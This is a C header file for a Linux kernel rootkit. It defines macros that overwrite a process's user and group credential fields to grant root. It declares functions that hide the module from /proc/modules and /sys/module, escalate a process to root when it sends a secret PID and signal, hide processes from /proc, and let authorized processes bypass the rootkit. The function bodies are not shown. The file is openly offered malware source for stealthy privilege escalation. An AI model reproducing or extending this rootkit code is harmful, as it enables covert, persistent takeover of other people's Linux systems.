#ifndef _ROOTKIT_UTILS_H_
#define _ROOTKIT_UTILS_H_

#include "macro_utils.h"
#include <asm/current.h>
#include <linux/kstrtox.h>
#include <linux/types.h>
#include <vdso/limits.h>

/**
 * Sets the value of a `kuid_t` variable.
 *
 * @param _kuid The `kuid_t` variable to change
 * @param _uid  The new value to set
 */
#define __SET_UID(_kuid, _uid) \
    do {                       \
        (_kuid).val = (_uid);  \
    } while (0)

/**
 * Sets the value of a `kgid_t` variable.
 *
 * @param _kgid The `kgid_t` variable to change
 * @param _gid  The new value to set
 */
#define __SET_GID(_kgid, _gid) \
    do {                       \
        (_kgid).val = (_gid);  \
    } while (0)

/**
 * Sets the value of the uid, suid, euid and fsuid fields of a `struct cred *` variable.
 *
 * @param _p_creds The `struct cred *` variable to change
 * @param _uid     The new value to set
 */
#define __SET_UIDS(_p_creds, _uid)            \
    do {                                      \
        __SET_UID((_p_creds)->uid, (_uid));   \
        __SET_UID((_p_creds)->suid, (_uid));  \
        __SET_UID((_p_creds)->euid, (_uid));  \
        __SET_UID((_p_creds)->fsuid, (_uid)); \
    } while (0)

/**
 * Sets the value of the gid, sgid, egid and fsgid fields of a `struct cred *` variable.
 *
 * @param _p_creds The `struct cred *` variable to change
 * @param _gid     The new value to set
 */
#define __SET_GIDS(_p_creds, _gid)            \
    do {                                      \
        __SET_GID((_p_creds)->gid, (_gid));   \
        __SET_GID((_p_creds)->sgid, (_gid));  \
        __SET_GID((_p_creds)->egid, (_gid));  \
        __SET_GID((_p_creds)->fsgid, (_gid)); \
    } while (0)

/**
 * Structure representing an entry in a list of PIDs.
 */
typedef struct pid_list_tag {
    struct list_head list; // PID linked list head
    pid_t i32_pid;         // PID value
} pid_list_t;

typedef struct task_struct task_t;

extern struct list_head hidden_pids_list; // Head of the hidden PIDs linked list
// Head of the authorized PIDs linked list (processes that bypass the rootkit)
extern struct list_head authorized_pids_list;

/**
 * Gets the effective PID for the given PID.
 * If it is 0, return the current PID.
 * If it is -1 or INT_MIN, return -1.
 * If it is < -1, return the absolute value.
 * Otherwise, return the given PID.
 *
 * @param i32_pid The PID to get the effective PID for
 * @return The effective PID
 */
static inline pid_t get_effective_pid(const pid_t i32_pid)
{
    if (i32_pid == 0) {
        return current->pid;
    }

    if (i32_pid == INT_MIN) {
        return -1;
    }

    if (i32_pid < -1) {
        return -i32_pid;
    }

    return i32_pid;
}

/**
 * Hides the rootkit from /proc/modules and /sys/module/.
 */
void hide_module(void);

/**
 * Elevates the current process to root.
 *
 * @param i32_pid The PID that was passed to the rootkit
 *                (should be equal to PID_SECRET_ROOT to be allowed to elevate)
 * @param i32_sig The signal that was passed (SIGROOT)
 * @return 0 on success, otherwise an error code
 */
long give_root(const pid_t i32_pid, const int i32_sig);

/**
 * Checks if the given PID is in the list of hidden processes.
 * If the given PID is 0, the current process is checked.
 *
 * @param i32_pid The PID to check
 * @return `true` if the given PID is in the list of hidden processes, `false` otherwise
 */
bool is_pid_hidden(const pid_t i32_pid);

/**
 * Hides or shows (unhides) the given process from /proc/ and /proc/PID/.
 * If the given PID is 0, the current process is (un)hidden.
 *
 * @param i32_pid The PID to (un)hide
 * @param i32_sig The signal that was passed (SIGHIDE or SIGSHOW)
 * @return 0 on success, otherwise an error code
 */
long show_hide_process(const pid_t i32_pid, const int i32_sig);

/**
 * Clears the list of hidden PIDs and frees all associated memory.
 */
void show_all_processes(void);

/**
 * Checks if the given PID is in the list of authorized processes.
 * If the given PID is 0, the current process is checked.
 * @note Authorized processes bypass the rootkit protection mechanisms.
 *
 * @param i32_pid The PID to check
 * @return `true` if the given PID is in the list of authorized processes, `false` otherwise
 */
bool is_process_authorized(const pid_t i32_pid);

/**
 * Authorizes the given process to bypass the rootkit protection mechanisms.
 * If the given PID is 0, the current process is authorized.
 *
 * @param i32_pid The PID to authorize
 * @param i32_sig The signal that was passed (SIGAUTH)
 * @return 0 on success, otherwise an error code
 */
long authorize_process(const pid_t i32_pid, const int i32_sig);

/**
 * Clears the list of authorized PIDs and frees all associated memory.
 */
void clear_auth_list(void);

#endif
